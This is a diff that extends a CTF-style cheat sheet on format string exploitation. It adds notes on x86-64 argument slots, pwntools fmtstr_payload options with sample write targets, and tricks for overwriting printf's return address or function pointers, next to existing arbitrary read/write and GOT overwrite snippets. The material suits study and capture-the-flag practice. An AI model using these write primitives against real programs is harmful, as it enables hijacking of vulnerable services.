@@ -2,6 +2,9 @@
 
 ## Table of Contents
 - [Format String Basics](#format-string-basics)
+  - [x86-64 Argument Lookup](#x86-64-argument-lookup)
+  - [pwntools fmtstr_payload Options](#pwntools-fmtstr_payload-options)
+  - [Compact Tricks](#compact-tricks)
 - [Argument Retargeting (Non-Positional %n Trick)](#argument-retargeting-non-positional-n-trick)
 - [Blind Pwn (No Binary Provided)](#blind-pwn-no-binary-provided)
 - [Format String with Filter Bypass](#format-string-with-filter-bypass)
@@ -41,6 +44,10 @@
 
 **IMPORTANT:** On x86-64, GOT entries are 8 bytes. Using `%n` (4-byte) leaves upper bytes with old libc address garbage. Use `%lln` to write full 8 bytes and zero upper bits.
 
+### x86-64 Argument Lookup
+
+`printf` receives the format itself in `rdi`; the remaining vararg slots are `rsi`, `rdx`, `rcx`, `r8`, `r9`, then consecutive stack slots. Positional selectors have no bounds check, and `%s` dereferences the selected slot, so an invalid pointer can crash before a write primitive is reached.
+
 **Arbitrary read primitive:**
 ```python
 def arb_read(addr):
@@ -50,10 +57,24 @@ def arb_read(addr):
     return io.recvuntil(b'#')[:-1]
 ```
 
+### pwntools fmtstr_payload Options
+
 **Arbitrary write primitive:**
 ```python
 from pwn import fmtstr_payload
 payload = fmtstr_payload(offset, {target_addr: value})
+
+# Tune the generator when the naive payload is too long, contains banned
+# bytes, or the sink has already printed part of the payload.
+payload = fmtstr_payload(
+    6,
+    {0x0804a048: 0xdeadbeef, 0x0804a04c: 0x1337babe},
+    numbwritten=8,
+    write_size='byte',
+)
+# offset      — first controllable vararg slot; find it with AAAA%p / cyclic %p
+# numbwritten — bytes printed before the format payload
+# write_size  — 'byte' for short payloads, or 'short'/'int' for fewer writes
 ```
 
 **Manual GOT overwrite (x86-64):**
@@ -91,6 +112,11 @@ payload = test + p64(0xDEADBEEF)
 - `printf@GOT`, `puts@GOT`, `putchar@GOT` are good alternatives
 - Target functions called AFTER the format string vulnerability
 - Check call order in disassembly to pick best target
+
+### Compact Tricks
+
+- If `printf`'s saved return address is reachable as a positional argument, a `%n` write can redirect `printf` itself.
+- Partially overwrite a function pointer when only its low bytes need to change; this is often shorter than a full format-string write.
 
 **Key insight:** Format string vulnerabilities are identified by sending `%p.%p.%p` as input -- if hex addresses appear in the output, the program passes user input directly as the format argument to `printf`/`sprintf`. This gives both arbitrary read (`%s` with a target address) and arbitrary write (`%n` family) primitives.
 
